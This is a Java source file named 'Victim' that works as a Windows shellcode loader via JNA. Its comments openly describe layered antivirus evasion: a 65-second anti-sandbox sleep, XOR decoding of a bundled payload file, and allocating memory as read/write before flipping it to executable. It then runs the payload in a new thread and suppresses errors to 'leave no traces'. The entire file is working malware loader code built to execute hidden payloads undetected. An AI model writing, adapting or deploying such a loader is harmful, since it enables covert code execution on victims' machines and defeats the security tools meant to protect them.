package shell;

import com.sun.jna.Native;
import com.sun.jna.win32.StdCallLibrary;
import java.io.InputStream;

public class Victim {

    public interface Kernel32 extends StdCallLibrary {
        Kernel32 INSTANCE = Native.load("kernel32", Kernel32.class);
        long VirtualAlloc(long lpAddress, long dwSize, int flAllocationType, int flProtect);
        long CreateThread(long lpThreadAttributes, long dwStackSize, long lpStartAddress, long lpParameter, int dwCreationFlags, long lpThreadId);
        int WaitForSingleObject(long hHandle, int dwMilliseconds);
        // Added VirtualProtect to flip memory permissions (Stealthier)
        boolean VirtualProtect(long lpAddress, long dwSize, int flNewProtect, com.sun.jna.ptr.IntByReference lpflOldProtect);
    }

    public static void main(String[] args) {
        try {
            // LAYER 1: Anti-Sandbox Delay
            // AV Sandboxes usually time out after 30-60 seconds.
            Thread.sleep(65000);

            InputStream is = Victim.class.getResourceAsStream("/data.dat");
            if (is == null) return;
            byte[] shellcode = is.readAllBytes();

            // LAYER 2: XOR Decryption
            // The shellcode is 'garbage' until this loop runs in RAM.
            byte key = (byte) 0xDE;
            for (int i = 0; i < shellcode.length; i++) {
                shellcode[i] = (byte) (shellcode[i] ^ key);
            }

            // Windows Constants
            int MEM_COMMIT = 0x1000;
            int MEM_RESERVE = 0x2000;
            int PAGE_READWRITE = 0x04;      // Not suspicious
            int PAGE_EXECUTE_READ = 0x20;   // Final state

            // LAYER 3: Memory Protection Flipping
            // Allocate as Read/Write only (Standard behavior)
            long address = Kernel32.INSTANCE.VirtualAlloc(0, shellcode.length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            com.sun.jna.Pointer pointer = new com.sun.jna.Pointer(address);
            pointer.write(0, shellcode, 0, shellcode.length);

            // Flip memory to Executable right before starting the thread
            com.sun.jna.ptr.IntByReference oldProtect = new com.sun.jna.ptr.IntByReference();
            Kernel32.INSTANCE.VirtualProtect(address, shellcode.length, PAGE_EXECUTE_READ, oldProtect);

            long threadHandle = Kernel32.INSTANCE.CreateThread(0, 0, address, 0, 0, 0);
            Kernel32.INSTANCE.WaitForSingleObject(threadHandle, -1);

        } catch (Exception ignored) {
            // If anything goes wrong, exit silently to leave no traces
        }
    }
}
